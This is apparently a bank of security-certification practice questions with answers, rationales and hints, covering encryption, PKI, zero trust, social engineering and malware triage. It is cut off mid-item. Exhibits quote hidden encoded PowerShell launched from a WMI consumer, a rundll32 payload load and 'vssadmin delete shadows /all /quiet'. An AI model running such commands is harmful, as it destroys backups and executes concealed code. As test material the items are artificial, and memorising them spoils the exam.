q: A health-tech startup stores patient exports in a public cloud object store. Its hospital customers now require that when a contract ends, every copy of that customer's data, including copies in the provider's internal backups the startup cannot reach, can be made unreadable within one business day. Which approach BEST meets this requirement?
o: Encrypt each tenant's data under its own managed key and delete the key at termination
Have the provider overwrite every storage block and issue a signed certificate of destruction
Turn on object versioning with a lifecycle rule that expires all versions after termination
Swap stored identifiers for tokens and purge the token vault once the contract has ended
w: Deleting a per-customer key renders every encrypted copy unreadable at once, including provider backups the startup can't touch (crypto-shredding). The provider can't overwrite backups on demand within a day, lifecycle rules only touch the copies the startup controls, and tokenizing identifiers leaves the rest of each record readable.
h: Can't reach every copy? Destroy the key that unlocks them all.

q: A firmware vendor still publishes MD5 checksums next to its downloads on the same web server that hosts the files. A researcher shows that an attacker who briefly controlled that server could post a tampered image together with a matching checksum. Which TWO changes would MOST improve customers' ability to trust a download?
o: Sign each image with the vendor's code-signing private key so devices verify it before installing
Publish SHA-256 hashes in place of MD5 hashes
Add a random salt to each checksum before publishing it
Serve the download page only over HTTPS with HSTS
Run every image checksum through PBKDF2 with 100,000 iterations
w: A signature made with a key the attacker doesn't hold can't be forged even with full control of the server, and SHA-256 removes MD5's practical collision weakness. HTTPS protects transit but not a compromised origin. Salting and PBKDF2 are password-storage techniques that add nothing to file integrity checks.
h: A hash says 'unchanged'; a signature says 'unchanged AND from us'.

q: A utility's 900 pole-mounted sensors all encrypt telemetry with the same AES-256 key, which was loaded at the factory. Last week a technician's truck was stolen with two spare sensors inside. Budget for a full redesign is limited this year. What is the MOST significant cryptographic weakness the theft exposes?
o: Extracting the fleet-wide key from one unit unlocks every unit's data
AES-256 is too weak to protect readings that must stay private for years
Symmetric ciphers give no integrity, so an attacker can alter readings at will
The 256-bit key length forces sensors into slow, insecure ECB block mode
w: With one shared symmetric key, extracting it from a single device compromises all 900; per-device keys (or asymmetric key exchange) limit the blast radius. AES-256 is strong, authenticated modes like GCM do provide integrity, and key length has nothing to do with the block mode chosen.
h: One key on 900 doors means one stolen door opens them all.

ack: Options are the exhibit's own cipher suite names.
q: An auditor is concerned that an adversary recording a bank's TLS traffic could decrypt it years later if the server's private key leaks. The server offers the cipher suites below. Which suite should be preferred to protect recorded sessions in that situation?
c:
1  TLS_RSA_WITH_AES_256_GCM_SHA384
2  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
3  TLS_RSA_WITH_3DES_EDE_CBC_SHA
4  TLS_DH_anon_WITH_AES_256_CBC_SHA256
o: TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
TLS_RSA_WITH_AES_256_GCM_SHA384
TLS_DH_anon_WITH_AES_256_CBC_SHA256
TLS_RSA_WITH_3DES_EDE_CBC_SHA
w: ECDHE creates a fresh ephemeral key per session, so a later leak of the RSA key can't decrypt recordings (forward secrecy). The TLS_RSA suites wrap session keys with the long-term key, so a leak exposes everything. DH_anon has no server authentication and invites on-path attacks, and 3DES is deprecated.
h: E in ECDHE = Ephemeral = Every session has its own key.

q: A regional retailer wants to shrink its PCI DSS assessment scope. Today, card numbers are stored in its order database, and the database encryption keys sit on the same application servers. A payment processor offers a hosted vault. Which change MOST reduces the number of retailer systems in scope?
o: Swap card data for issued tokens and hold the real card data with the third party
Encrypt the card column with AES-256 and rotate those encryption keys every 90 days
Mask all but the last four digits on every screen, report, and printed receipt
Keep only an unsalted SHA-256 hash of each card instead of the full card data
w: Tokens have no mathematical link to the card number, so systems holding only tokens can fall out of scope. Encrypted data with keys in the same environment stays in scope, masking changes only the display, and an unsalted hash of a 16-digit number with a known structure can be brute-forced.
h: Encrypted cards are still cards. Tokens are just claim tickets.

q: A law firm receives a contract that the counterparty digitally signed. The firm's paralegal wants to confirm the document is authentic before filing it. Which key is used to verify the signature, and what does a successful check prove?
o: The counterparty's public key; it proves the file is unaltered and from that signer
The firm's own private key; it proves only the firm is able to open and read the file
The counterparty's private key; it proves the file was encrypted while it was in transit
The firm's public key; it proves the counterparty received the firm's latest draft version
w: Signatures are created with the signer's private key and verified with the signer's public key, proving integrity and origin. The firm's own keys play no part in checking someone else's signature, nobody but the signer ever holds the signer's private key, and signing is not encryption.
h: Sign with your private, verify with their public.

q: Two branch routers must agree on a fresh session key over an untrusted internet link. Neither router may ever transmit the key itself, and an eavesdropper who records every packet must not be able to compute it. Which technique provides this?
o: Diffie-Hellman key exchange
RSA key transport
Key escrow with a trusted third party
Pre-shared static keys
w: Diffie-Hellman lets both sides derive the same secret from exchanged public values, so the key itself never crosses the wire. RSA key transport sends an encrypted copy of the key, escrow stores keys rather than agreeing on them, and a static pre-shared key is neither fresh nor negotiated.
h: DH: both sides bake the same cake without ever shipping it.

q: After the help desk applied a firmware update to 40 laptops, each one booted to a BitLocker recovery screen asking for the 48-digit recovery key. Disks, users, and network settings are unchanged. What MOST likely caused the prompt?
c:
Event 24620  Microsoft-Windows-BitLocker-API
BitLocker could not unlock drive C: using the TPM.
Platform Configuration Register (PCR) 0 and PCR 2 values differ from those sealed at protection time.
o: Changed firmware measurements stopped the TPM from unlocking the volume key
The HSM that stores the laptops' recovery keys could not be reached during boot
The laptops' code-signing certificate expired as part of the firmware update
Active Directory key escrow deleted the stored BitLocker recovery passwords
w: BitLocker seals the volume key to TPM measurements (PCRs) of the boot chain; firmware changes alter those values, so the TPM refuses to unseal until the recovery key is entered. Laptop unlock doesn't depend on an HSM or a code-signing certificate, and escrowed recovery keys being deleted wouldn't trigger the prompt in the first place.
h: Change the boot chain, and the TPM won't recognize the house.

q: A web server's certificate was revoked at 09:00 after its private key was exposed. At 14:00 many clients are still connecting without warnings. The clients check revocation using the CRL below and do not use OCSP. What BEST explains why the revocation has not taken effect?
c:
Certificate Revocation List
  Issuer:       CN=Example Issuing CA 3
  This Update:  2026-11-10 22:00 UTC
  Next Update:  2026-11-11 22:00 UTC
  Revoked:      0x3A91...  (2026-11-09)
o: Revocation shows up only once a newer list is published and fetched
The certificate must be reissued with a new serial before it can be revoked
A CRL lists only certificates that have already passed their expiry dates
Revocation applies only after the root CA re-signs its own root certificate
w: Clients cache a CRL until Next Update, so a revocation made after This Update isn't visible until a newer CRL is fetched; OCSP or more frequent CRL publishing narrows that window. Revocation doesn't change serials, CRLs list unexpired revoked certificates, and the root doesn't re-sign itself to revoke a leaf.
h: A CRL is a newspaper: today's news isn't in yesterday's edition.

q: A company runs an internal wiki at wiki.corp.local used by 300 employees on domain-joined laptops. Staff are tired of browser warnings from its self-signed certificate, and budget is tight. What is the BEST way to give the site a certificate that browsers will trust?
o: Issue it from an enterprise CA whose root certificate is distributed through Group Policy
Purchase a domain-validated certificate for wiki.corp.local from a public CA
Purchase a public wildcard certificate that covers every host under *.corp.local
Have each user permanently trust the self-signed certificate in their browser
w: An internal CA can issue certificates for internal names, and pushing its root via Group Policy makes every managed laptop trust them at no per-certificate cost. Public CAs won't issue for internal-only names like .local, and training users to click through warnings weakens defenses against on-path attacks.
h: Internal names need an internal CA.

q: A bank is designing a two-tier PKI. The architect recommends keeping the root CA powered off in a safe and issuing all end-entity certificates from an online intermediate CA. Which benefit MOST justifies this design?
o: A breached intermediate can be revoked while the trusted root stays completely untouched
Certificates issued by an intermediate no longer need any revocation checking
Keeping the root offline makes issuing certificates faster during peak demand
Intermediate CAs let clients skip validating the full certificate chain on use
w: Protecting the root offline means a breach of the online issuing CA can be fixed by revoking and replacing the intermediate, while the root that every device trusts stays intact. Intermediate-issued certificates still need revocation checks and full chain validation, and an offline root doesn't speed up issuance.
h: Keep the master key in the safe; hand out copies you can cancel.

q: A retailer's OCSP responder went down for three hours, but customers' browsers kept connecting to its site normally, including during a window when one of its certificates was actually revoked. Which change would BEST let browsers receive fresh revocation status even if clients can't reach the responder themselves?
o: Enable OCSP stapling on the web servers
Shorten the CRL publication interval to one hour
Replace the certificates with a single wildcard certificate
Configure clients to fail open when OCSP is unreachable
w: With stapling, the server periodically fetches a signed OCSP response and attaches it to the handshake, so clients get current status without contacting the responder themselves. Many browsers already soft-fail on unreachable OCSP (the cause of the problem), CRL timing doesn't help browsers that don't fetch CRLs, and a wildcard changes nothing about revocation.
h: Stapling: the server brings its own doctor's note.

q: Monitoring scripts reach an internal API by IP address. After a certificate renewal, they fail with the error below, but browsers using the hostname work fine. What is the BEST fix?
c:
curl: (60) SSL: no alternative certificate subject name matches target host name '10.0.5.20'
Subject: CN=api.corp.example.com
X509v3 Subject Alternative Name: DNS:api.corp.example.com
o: Use the DNS name in the scripts, or add a SAN entry for 10.0.5.20
Turn off certificate validation in each of the monitoring scripts
Re-key the certificate with a longer RSA key and reinstall it
Revoke it and request a wildcard certificate for *.corp.example.com
w: Name validation compares the name the client used against the certificate's SANs; the certificate only lists the hostname, so either use that name or include an IP SAN. Turning off validation removes protection against on-path attacks, key length doesn't affect name matching, and a wildcard still wouldn't match a bare IP address.
h: The certificate must name the address you actually typed.

q: An administrator generated a CSR on her workstation, sent it to the CA, and received the signed certificate. When she tries to bind it on the production web server, the server reports that no private key is associated with the certificate. What is the MOST likely cause?
c:
PS C:\> certutil -repairstore my 7f2c...
CertUtil: -repairstore command FAILED: 0x80090016 (-2146893802 NTE_BAD_KEYSET)
CertUtil: Keyset does not exist
o: Its key pair was created on her PC when the CSR was made, not on the web host
The CA retained the private key and has to email it to her as a separate file
The certificate's EKU was issued for client authentication instead of server use
The web host's TPM has to be cleared before any certificate can be imported
w: A CSR's key pair is created where the CSR is generated, so the matching private key lives on her workstation; she must export and import it securely or generate a new CSR on the server. CAs never hold or send the subscriber's private key, and EKU or TPM state wouldn't produce a missing keyset error.
h: The key is born where the CSR is born.

q: A hospital is replacing its flat VPN with a zero trust design. During the architecture review, an auditor asks the security architect to separate the components that make and coordinate access decisions from the ones that carry or enforce traffic. Which TWO components belong to the control plane?
o: Policy engine
Policy administrator
Policy enforcement point
Subject and system
Implicit trust zone
w: The control plane decides and coordinates: the policy engine makes the access decision and the policy administrator sets up or tears down the session. The policy enforcement point, the subjects requesting access, and the implicit trust zones behind enforcement points sit in the data plane where traffic flows.
h: Control plane = judge and clerk. Data plane = the door, the visitor, and the room.

q: After a breach spread through flat service accounts, a fintech redesigns its platform. Each microservice now receives credentials scoped to the single table it needs, and network policies allow only the specific service-to-service flows each one requires. Which zero trust concept does this redesign MOST directly apply?
o: Threat scope reduction
Adaptive identity
Implicit trust zones
Policy-driven access control
w: Limiting what each identity and workload can reach shrinks the blast radius of any compromise, which is threat scope reduction. Adaptive identity adjusts authentication to context, implicit trust zones are what zero trust removes, and the policy administrator is a control-plane component, not a design concept.
h: Shrink what each key can open, and a stolen key opens little.

q: A hospital replaces its remote-access VPN, which gave clinicians a full network connection once they logged in. Under the new design, each clinician reaches only the specific applications they are entitled to, and every request is re-evaluated against user identity and device health. Which solution does this describe?
o: Zero trust network access (ZTNA)
Full-tunnel IPsec VPN
SD-WAN with application steering
Network access control on switch ports
w: ZTNA brokers per-application access after verifying identity and posture for each session, instead of placing the user on the network. A full-tunnel VPN still grants network-level access, SD-WAN optimizes WAN paths between sites, and switch-port NAC governs local wired connections, not remote application access.
h: VPN gives you the building; ZTNA gives you one room at a time.

q: A penetration test of a data center finds that once any server on the production VLAN was compromised, the testers could reach every other production server on every port with no further authentication. The CISO asks what concept the finding illustrates and which control addresses it. Which answer is BEST?
o: An implicit trust zone; microsegment workloads with explicit allow rules
An adaptive identity gap; require step-up MFA for every server administrator
A control plane gap; deploy a second policy engine for redundancy and failover
Weak threat intelligence; subscribe to a proprietary indicator feed for servers
w: Traffic trusted simply because it's inside the VLAN is an implicit trust zone, and microsegmentation that permits only required flows removes it. Admin MFA doesn't stop server-to-server lateral movement, policy engine redundancy addresses availability, and threat feeds don't restrict east-west traffic.
h: Inside the fence shouldn't mean inside every room.

ack: Options are fixed SY0-701 term names of different lengths.
q: A cloud SaaS company writes its authorization rules centrally, for example 'Finance data requires a managed device, a compliant OS version, and a user in the Finance group.' Every request to every app is evaluated against these rules at the moment it is made. Which zero trust control plane concept does this describe?
o: Policy-driven access control
Implicit trust zone
Threat scope reduction
Subject and system
w: Centrally defined policies evaluated for every request are policy-driven access control. An implicit trust zone grants trust by location, threat scope reduction is about limiting reach after access, and the subject is the requester rather than the rule set.
h: Write the rule once; check it every time.

q: A manufacturer deploys a server in its server VLAN that looks like an old file server named FS-ARCHIVE but hosts nothing real. No business process should ever connect to it. The SOC asks what makes alerts from this system especially valuable. Which answer is BEST?
o: No one should touch it, so any connection is a strong signal
It blocks attackers before they can ever reach the genuine file servers
It removes the need for endpoint detection tools on the real servers
It encrypts each visitor's traffic so the source can be traced later
w: A honeypot has no legitimate users, so any interaction is a strong signal of scanning or lateral movement. It detects rather than blocks, it doesn't replace protection on real assets, and it doesn't encrypt or trace traffic by itself.
h: Nobody should knock on a fake door, so every knock counts.

q: An identity team creates an Active Directory account named 'svc_backup_old' with a convincing description, no group memberships, and a password that is never used. The SIEM alerts on any authentication attempt by that account. What is this account?
o: A honeytoken
A honeynet
A service account with least privilege
A disabled account kept for audit purposes
w: A fake credential that has no legitimate use and alerts when anyone tries it is a honeytoken. A honeynet is a group of decoy systems, a least-privilege service account still does real work, and an account kept only for audit isn't set up as bait.
h: A credential nobody needs is a tripwire when somebody uses it.

q: During an active ransomware outbreak at 03:00, the on-call engineer adds a firewall rule blocking SMB between all workstation subnets. The CAB doesn't meet until Thursday, and the engineer's manager approved the change by phone. What should happen with this change NEXT?
o: Document it as an emergency change and submit it for retroactive CAB review
Roll it back until the CAB can approve it on Thursday
Leave it undocumented, because emergency actions are exempt from change management
Open a standard change request and wait for the next maintenance window to apply it
w: Emergency changes are allowed to bypass the normal timeline but must still be documented and reviewed afterward so the record and approvals stay complete. Rolling back reopens the outbreak path, skipping documentation leaves an unknown rule in production, and the change is already applied.
h: Emergency changes skip the line, not the paperwork.

q: A database team applied a vendor-supplied index change in production during an approved window, with a backout plan ready. Within minutes, the nightly billing job that runs on the same server failed, and the backout took two hours. The post-change review asks which step would MOST likely have caught the problem before production. Which step is it?
o: Running it first in a staging copy with the same scheduled jobs
Shortening the maintenance window to limit how long systems are exposed
Adding a second database approver to the change advisory board roster
Updating the network diagrams and runbooks once the change is complete
w: Testing in an environment that runs the same jobs would have shown the billing failure before it hit production. A shorter window or an extra approver doesn't reveal technical conflicts, and diagram updates happen after the change and don't test anything.
h: Approval says 'allowed'; testing says 'works'.

q: A security patch for a clinic's scheduling application requires restarting the application service, which signs out every logged-in user and cancels any half-finished bookings. The change request lists the patch, a backout plan, and approvals, but nothing about this. Which technical implication should be added to the change plan?
o: The restart and its effect on users who are signed in
An update to the application allow list for the new binaries
Compatibility with the legacy operating system the app runs on
Downtime for the network switches that connect the clinic
w: The restart and its user impact must be planned, timed, and communicated. The allow list is relevant only when executables change, nothing says the OS is legacy, and the switches aren't touched by an application patch.
h: If it restarts, someone gets kicked out. Plan for them.

q: The PKI team replaced the certificate on the LDAP directory servers during an approved change. Within an hour, a legacy HR application stopped authenticating users, because it had been configured to trust only the old certificate's exact fingerprint. Which change management consideration was MOST clearly missed?
o: Identifying what depends on the component being changed
Scheduling the change inside the approved maintenance window
Adding the new certificate to the application's deny list
Collecting sign-off from every stakeholder before the change
w: The HR application depended on the exact certificate, so a dependency review would have flagged it for coordinated updating. The change was already approved and scheduled, and a deny list isn't involved in certificate trust.
h: Before you change a part, ask what else is bolted to it.

q: A colocation provider's contract with a payment processor requires multifactor authentication at every data hall door, and the auditor will test each door. The provider is choosing between four configurations already supported by its hardware. Which configuration meets the requirement?
o: A badge reader combined with a PIN keypad
Two badge readers in an access control vestibule
A badge reader with a security guard checking badges visually
A PIN keypad plus a posted sign naming authorized staff
w: A badge (something you have) plus a PIN (something you know) uses two factor categories. Two badge reads are the same factor twice, a guard glancing at the same badge adds a check but not a new factor category, and a sign is a directive control, not a factor.
h: Two different kinds of proof, not the same proof twice.

q: A warehouse's electronic locks on emergency exit doors are being replaced. The fire marshal requires that people can always leave the building if power fails during a fire, while the server room door must stay locked during a power failure. Which settings meet both requirements?
o: Exit doors fail-safe; server room door fail-secure
Exit doors fail-secure; server room door fail-safe
Both doors fail-closed
Both doors fail-open
w: Fail-safe locks release when power is lost, protecting life safety on exit doors, while fail-secure locks stay locked, protecting assets. The reversed pairing endangers people and leaves the server room open, and fail-open/fail-closed describe network devices, not door hardware.
h: Fail-safe protects people; fail-secure protects things.

q: After a theft, a credit union finds that its branch camera system overwrote all footage after seven days, and the theft was discovered on day ten. The cameras themselves recorded clearly. Which change would MOST directly prevent this gap in the future?
o: Retain recordings for longer than the typical time it takes to detect an incident
Add motion-activated floodlights covering the whole parking lot
Install steel bollards in front of the branch's main entrance
Hire a guard to watch every live camera feed overnight
w: The gap was retention, not camera coverage, so retention must exceed the realistic time to discover an incident. Lighting and bollards address different threats, and live monitoring still wouldn't recover footage that had already been overwritten.
h: Footage you didn't keep is footage you don't have.

q: A biotech campus already has fencing, cameras, and badge readers. Leadership wants a control that can recognize unusual situations, such as a delivery driver wandering toward the lab wing, question people, and decide how to respond in real time. Which control BEST meets this need?
o: Security guards
Additional video surveillance
Pressure sensors in hallways
An access control vestibule at the lobby
w: Guards apply human judgment and can intervene, which cameras and sensors cannot. More cameras record and sensors detect presence, but neither decides or responds, and a vestibule controls one entry point rather than reacting to behavior across the campus.
h: Cameras watch; guards think.

q: A software company's three senior engineers shared one symmetric key used to encrypt nightly backups of the customer database. One of them was terminated today after a dispute. The backup system supports re-encrypting existing archives. What should the security team do FIRST about the key?
o: Rotate to a new key and re-encrypt everything protected by the old one
Lengthen the key from 128 to 256 bits and keep using it going forward
Move the old key into a hardware security module for safekeeping
Have the two remaining engineers sign a new nondisclosure agreement
w: Anyone who had the old key can still decrypt backups made with it, so the key must be rotated and existing archives re-encrypted. A longer key, an HSM, or an NDA does nothing about the copy of the key the former employee may still have.
h: When someone leaves with a key, change the lock.

q: A caller tells a credit union's help desk he is from the external audit firm, names the CFO and the audit partner correctly (both listed on the firm's website), and asks for the VPN group name 'to finish today's fieldwork.' The agent wants a control that stops this without slowing real auditors much. Which control is BEST?
o: Call back on the number in the vendor directory before sharing anything
Check that the caller ID on the incoming call matches the audit firm's main line
Ask the caller to confirm the CFO's name and the audit start date before helping
Record the call so the security team can review it later if something goes wrong
w: A callback to a number you already trust defeats pretexting, because the attacker can't answer it. Caller ID is easily spoofed, the 'proof' questions use public information the caller already has, and recording helps investigate but prevents nothing.
h: Never verify someone using the channel they chose.

q: An accounts payable clerk receives a reply in a months-long email thread with a real supplier, asking to update the remittance account. The message passed SPF, DKIM, and DMARC, and the gateway raised no alert. Later the supplier confirms its mailbox was compromised. Why did the gateway MOST likely let the message through?
o: It came from the supplier's real, authenticated mail system, so the checks were valid
The supplier's SPF record ended in ~all, so the forged message only soft-failed the check
The attacker registered a lookalike domain and published valid DKIM keys for that domain
The gateway skips DMARC evaluation on replies that sit inside an existing conversation
w: In vendor email compromise the attacker sends from the real, compromised account, so authentication passes honestly; only process controls like callback verification catch it. The headers passed, so it wasn't a soft-fail or a different domain, and gateways don't exempt replies from DMARC.
h: Authentication proves which mailbox sent it, not who was typing.

q: Threat intel reports that an industry news site popular with energy-sector engineers was compromised. Its malicious script runs only for visitors whose source IP belongs to three specific utilities, and everyone else sees the normal page. Which attack does this BEST describe?
o: A targeted watering hole
Pharming through poisoned DNS records
Brand impersonation of the news site
Typosquatting on the news site's domain
w: Compromising a site a target group already visits, and serving the payload only to that group, is a targeted watering hole. Visitors reached the real site by its real name, so there's no DNS poisoning, lookalike domain, or impersonated brand.
h: Poison the well, but only for one village.

q: Employees receive texts saying 'IT: we're upgrading your account. Reply with the 6-digit code we just sent you.' Each text arrives seconds after the attacker starts a password reset or login using a stolen password. Training has reduced but not eliminated replies. Which technical control would MOST reduce the success of this campaign?
o: FIDO2 authentication, which has no code a user can read out
A longer, more complex password policy enforced across every account
Blocking text messages from numbers outside the company's carrier plan
Lengthening the one-time code from six digits to eight digits
w: The attack depends on a code the user can read and relay; FIDO2 has no shareable code and is bound to the real site. Password rules don't help when the password is already stolen, attackers send from numbers that look legitimate, and a longer code can be relayed just as easily.
h: If there's no code to read aloud, there's nothing to smish.

q: A controller receives a phone call in what sounds exactly like the CFO's voice, citing a real acquisition and asking for an urgent $240,000 wire before the market closes. Audio forensics later confirms the voice was AI-generated. Which control would MOST reliably have stopped the payment?
o: Dual approval plus a callback to a known number for unusual transfers
Voice biometrics that compare callers against recordings of each executive
Training staff to listen carefully for robotic artifacts in callers' voices
Requiring the caller to state the acquisition's internal project code name
w: A procedural control that verifies through a separate, trusted channel and requires a second approver works no matter how convincing the voice is. Voice biometrics and listening for artifacts can be fooled by good deepfakes, and an insider-sourced code name may already be known to the attacker.
h: When the voice is perfect, trust the process, not the voice.

q: A fabricated 'press release' claiming that a regional bank lost customer data spreads across social media through accounts created the same week. Reporters start calling. The bank's systems show no breach. Which term BEST describes the campaign?
o: Disinformation
Misinformation
Brand impersonation
Watering hole
w: False content deliberately created and spread to deceive is disinformation; misinformation is false content shared without that intent. Nobody is posing as the bank's own channels, and no website was compromised to deliver malware.
h: Dis = deliberate. Mis = mistaken.

q: A man carrying two large boxes waits by a badge-controlled side door until an employee arrives, then thanks her as she holds the door for him. Security footage shows he never badged in. Leadership wants a control that does not depend on employees confronting strangers. Which control BEST fits?
o: An access control vestibule that admits one badge holder at a time
Annual training telling staff to challenge anyone without a visible badge
A larger warning sign stating that tailgating is prohibited at this door
Additional cameras recording the side door entrance around the clock
w: A vestibule physically enforces one person per authorized badge, so it works even when someone is polite. Training and signs still rely on people confronting a stranger, and cameras record the event without preventing it.
h: Kindness holds doors; mantraps don't.

q: A phishing email asks staff to scan a QR code 'to keep your payroll direct deposit active.' The email gateway rewrites and scans every URL in messages, yet raised no alert, and several employees scanned the code with personal phones. Why did the gateway MOST likely miss the link?
o: The URL was inside an image, so the message text held no link to rewrite
The gateway only inspects attachments that are larger than one megabyte in size
QR codes are encrypted, so the gateway had no way to decode their contents
The sender signed with DKIM, which turns off URL rewriting for signed mail
w: Image-based lures hide the URL inside a picture, so URL-rewriting engines see no link, and scanning on personal phones also bypasses corporate web filtering. QR codes aren't encrypted, size thresholds don't cause this, and DKIM signing doesn't disable inspection.
h: A link in a picture isn't a link to the filter.

q: A person in a utility company's uniform arrives at a hospital's loading dock with a printed work order to 'inspect the electrical panel in the server room.' The facilities office has no record of the visit. What should the dock supervisor do FIRST?
o: Hold the visitor outside and verify the job through a known internal contact
Escort the visitor to the server room and watch the inspection closely throughout
Photograph the visitor's badge and let the scheduled inspection go ahead as planned
Ask the visitor to call their dispatcher and put them on speaker to confirm the visit
w: Impersonation with a pretext is defeated by verifying independently before granting access. An escort still lets an attacker reach the server room, a photo records rather than verifies, and the visitor's own 'dispatcher' may be an accomplice.
h: Uniforms are cheap; verify the work order, not the outfit.

q: Customers of an online bank report getting fast replies from a support account on a social platform that uses the bank's logo and a near-identical handle. The account sends them to a page that collects login details. Which term BEST describes the attacker's technique?
o: Brand impersonation
Typosquatting
Watering hole
Disinformation
w: Posing as the company's own support channel with its branding is brand impersonation. Typosquatting relies on users mistyping a domain, a watering hole compromises a site victims already visit, and disinformation spreads false narratives rather than harvesting credentials.
h: They're wearing the bank's logo like a costume.

q: Attackers have twice convinced a company's help desk to reset executives' passwords over the phone by citing personal details found online. The CISO wants to keep phone support but stop these resets. Which TWO controls would MOST directly help?
o: Call the user back on the number stored in the HR system before any reset
Require identity proofing through an MFA prompt or manager approval before resetting
Verify identity using date of birth and mother's maiden name before any reset
Check that the incoming caller ID matches the executive's mobile number
Require executives to choose passwords of at least 20 characters
w: Calling back on a stored number and requiring proof the attacker can't have (an MFA approval or manager sign-off) defeat pretexting. Personal details are exactly what attackers find online, caller ID is spoofable, and longer passwords don't matter if the help desk resets them.
h: Verify with something the attacker can't look up or fake.

q: A red team retrieves printed org charts, vendor invoices with account numbers, and sticky notes listing temporary passwords from the recycling bins behind a law firm. The firm already has a clean desk policy. Which control MOST directly addresses this finding?
o: Locked shred bins and a mandatory shredding policy for sensitive paper
A clean desk policy enforced by monthly manager inspections
Data loss prevention rules on outbound email and web uploads
Full-disk encryption on every workstation and laptop
w: Dumpster diving is stopped by destroying paper before it leaves the building. The clean desk policy covers desks, not discarded paper, and DLP and disk encryption protect digital data rather than printouts in the trash.
h: If it's printed, shred it before it's trash.

q: A manufacturer restored all of its encrypted servers from immutable backups within a day of a ransomware attack. A week later, the attackers emailed customers proof that they hold 300 GB of design files and threatened to publish them. Which additional control would have MOST directly reduced this second-stage impact?
o: Egress monitoring and DLP to catch large outbound transfers
More frequent backups so less data would have needed restoring
Moving the backups to a second region with a different provider
Shorter backup retention so stale copies can't be held for ransom
w: Double extortion relies on data stolen before encryption; backups fix availability but do nothing about confidentiality, so detecting and stopping the exfiltration is what matters. Backup frequency, location, and retention all affect recovery, not data theft.
h: Backups bring the data back; they don't bring the leak back.

q: An incident responder finds no malicious files on a compromised workstation, yet the attacker regains access after every reboot. The responder runs the query below. Which technique explains the persistence?
c:
PS> Get-WmiObject -Namespace root\subscription -Class __EventFilter | Select Name,Query
Name      : SysPerf
Query     : SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'
PS> Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Select CommandLineTemplate
CommandLineTemplate : powershell -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIA...
o: Fileless malware persisting through WMI
A kernel rootkit hiding its files from the OS
A logic bomb waiting for a specific date
A worm re-infecting the host from the network
w: A WMI filter and consumer that launch encoded PowerShell is fileless persistence: the code lives in the WMI repository and memory, not in ordinary files. A rootkit hides real files, a logic bomb waits for a condition rather than re-launching every boot, and a worm would show network propagation.
h: No file to find? Look where Windows stores its own automations.

q: Several marketing staff installed a free 'coupon finder' browser extension. Proxy logs show each browser sending every visited URL, including internal wiki pages, to an analytics domain in another country. The extension displays no ads. Which classification BEST fits?
o: Spyware
Bloatware
Ransomware
A logic bomb
w: Software that secretly collects and sends out user activity is spyware. Bloatware is unwanted preinstalled software, ransomware encrypts or extorts, and a logic bomb waits for a trigger condition.
h: It's quietly writing down everywhere you go.

q: A server was wiped and reinstalled from clean media after a compromise, but the same beacon reappeared within an hour of the first boot, before any software was installed. Secure Boot was disabled on that model. Which explanation is MOST likely?
o: Malware living in system firmware beneath the operating system
A Trojan hidden inside the supposedly clean installation media
A logic bomb scheduled in the domain's Group Policy for that host
A worm spreading again from an unpatched host on the same subnet
w: Persistence that survives a full OS reinstall before any software is added points to firmware or bootkit-level malware, which Secure Boot is designed to detect; the fix is reflashing firmware and enabling Secure Boot. Clean media and a GPO would affect many hosts, and a worm would need time and a network path to reinfect.
h: If a fresh install is reinfected, look under the OS.

q: EDR shows the process tree below on the first host that alerted in a ransomware outbreak. Which event BEST identifies the initial infection point?
c:
10:42:11  explorer.exe > OUTLOOK.EXE
10:42:58  OUTLOOK.EXE > WINWORD.EXE  Invoice_8812.docm
10:43:02  WINWORD.EXE > cmd.exe /c powershell -w hidden -enc ...
10:43:05  powershell.exe > rundll32.exe C:\Users\Public\upd.dll,Start
11:17:40  rundll32.exe > vssadmin.exe delete shadows /all /quiet
11:18:02  rundll32.exe > encryptor.exe
o: A macro-enabled attachment opened in Word at 10:42:58
The vssadmin command that deleted shadow copies at 11:17:40
The encryptor process that started at 11:18:02
The rundll32 launch of upd.dll from a public folder at 10:43:05
w: The chain starts when Outlook opens a .docm attachment and Word spawns a shell, which is the delivery and execution point. The rundll32 load is the next stage, and vssadmin and the encryptor are late actions that inhibit recovery and encrypt.
h: Follow the tree back to the first thing the user clicked.

q: An insurer's EDR repeatedly blocks Word and Excel from launching PowerShell and cmd.exe after users open documents from outside the company. The team wants a preventive control that stops this behavior before EDR has to react. Which control BEST meets the goal?
o: Block internet-sourced macros and apply attack surface reduction rules
Require users to save every attachment to OneDrive before opening it
Upgrade all employees to the newest version of the Office productivity suite
Add each attacker file hash to the antivirus blocklist as it is found
w: Blocking internet-sourced macros and preventing Office apps from spawning child processes cuts off the technique itself. Saving to cloud storage doesn't change macro behavior, a version upgrade alone doesn't block macros, and hash blocklists fail against each new file.
h: Stop Office from being a launcher.

q: Within two hours, malware spread to 60 servers at a hosting company by guessing weak local administrator passwords over RDP, with no user interaction. The servers sit on one flat network, and RDP is open from every subnet. Which change would MOST limit a repeat?
o: Restrict RDP to a jump host and segment the server tier
Install antivirus with daily signature updates on every server
Change the RDP listening port from 3389 to a random high port
Send staff a phishing awareness reminder about suspicious email
w: A self-propagating worm needs reachable services; limiting RDP to a jump host and segmenting removes the paths. Signatures lag new variants, a port change is easily found by scanners, and phishing training doesn't address an automated network worm.
h: A worm can only walk through doors that are open.

q: A suspicious attachment ran cleanly in the email gateway's sandbox for its full three-minute analysis window and was delivered. On user endpoints it waited 40 minutes before contacting its command server. Which control would MOST likely have caught it after delivery?
o: EDR watching behavior on each user device
A longer sandbox analysis window of five minutes per attachment
Strict SPF and DKIM enforcement on every inbound email message
A web application firewall placed in front of the mail server
w: Sandbox-evading malware delays its payload, so behavior monitoring on the endpoint, where it eventually acts, is what catches it. Five minutes is still shorter than a 40-minute sleep, email authentication doesn't inspect payloads, and a WAF protects web apps, not endpoints.
h: If it waits out the sandbox, catch it where it finally wakes up.

q: A sales director's account was taken over even though MFA is required for every login. Investigation shows info-stealer malware on her home PC copied browser data, and the attacker then accessed the SaaS CRM from another country without any MFA prompt. What MOST likely let the attacker skip MFA?
o: A stolen session cookie was replayed while it was still valid
The authenticator app on her phone was cloned through a SIM swap
Her password was cracked from a weak hash stored by the vendor
The CRM disabled MFA for logins made from foreign countries
